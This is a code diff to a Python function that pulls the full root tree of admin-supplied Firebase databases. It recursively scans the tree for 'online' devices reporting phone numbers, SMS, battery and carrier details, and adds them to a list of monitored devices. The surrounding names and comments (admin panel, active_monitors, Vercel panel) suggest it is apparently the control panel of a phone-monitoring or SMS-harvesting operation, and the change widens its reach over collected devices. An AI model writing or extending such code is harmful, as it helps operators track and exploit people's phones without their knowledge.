@@ -227,32 +227,46 @@ def get_online_devices():
     firebases = db_data.get("firebases", [])
     
     if not firebases:
-        return None # Agar admin ne koi firebase add nahi kiya
+        return None
         
     for fb_url in firebases:
+        fb_url = fb_url.strip().rstrip('/')
         try:
-            # Vercel panel jise URL se data laata hai
-            res = requests.get(f"{fb_url}/clients.json", timeout=10)
-            print(f"[FB DEBUG] {fb_url} -> {res.status_code} | raw: {res.text[:300]}")
-            if res.status_code == 200:
-                data = res.json()
-                if data:
-                    # assumption: handle both dict and list responses from /clients.json
-                    if isinstance(data, list):
-                        data = {str(i): v for i, v in enumerate(data)}
-                    for dev_id, dev_info in data.items():
-                        if not isinstance(dev_info, dict):
-                            continue
-                        # Broader online check: status "online" or boolean online=True
-                        status_ok = str(dev_info.get('status', '')).lower() == 'online' or dev_info.get('online') is True
-                        if status_ok:
-                            if dev_id not in db_data.get('active_monitors', {}):
+            # fixed: fetch entire root tree to auto-detect devices regardless of node names
+            res = requests.get(f"{fb_url}/.json", timeout=10)
+            print(f"[FB DEBUG] {fb_url}/.json -> {res.status_code} | raw: {res.text[:300]}")
+            if res.status_code != 200 or not res.json():
+                continue
+                
+            root_data = res.json()
+            
+            # assumption: recursively scan tree to find device nodes containing common keys
+            def _scan(node, current_path=""):
+                if isinstance(node, dict):
+                    status_val = str(node.get('status', '')).lower()
+                    online_val = str(node.get('online', '')).lower()
+                    is_online = status_val in ['online', 'active', '1', 'true', 'connected'] or online_val in ['true', '1', 'online']
+                    
+                    if is_online and any(k in node for k in ['number', 'phone', 'battery', 'sms', 'device_id', 'model']):
+                        dev_id = current_path.split('/')[-1] or node.get('device_id', node.get('id', 'Unknown'))
+                        if dev_id not in db_data.get('active_monitors', {}):
+                            # fixed: prevent duplicates in case of overlapping nested nodes
+                            if not any(d['device_id'] == dev_id for d in all_devices):
                                 all_devices.append({
                                     "device_id": dev_id,
-                                    "number": dev_info.get('number', 'Unknown'),
-                                    "battery": dev_info.get('battery', 'N/A'),
-                                    "network": dev_info.get('network', 'N/A')
+                                    "number": node.get('number', node.get('phone', node.get('phoneNumber', 'Unknown'))),
+                                    "battery": str(node.get('battery', node.get('batteryLevel', 'N/A'))),
+                                    "network": node.get('network', node.get('operator', node.get('carrier', 'N/A')))
                                 })
+                        return
+                    for k, v in node.items():
+                        _scan(v, f"{current_path}/{k}" if current_path else k)
+                elif isinstance(node, list):
+                    for i, v in enumerate(node):
+                        _scan(v, f"{current_path}/{i}")
+                        
+            _scan(root_data)
+            
         except Exception as e:
             print(f"Firebase fetch error: {e}")
             
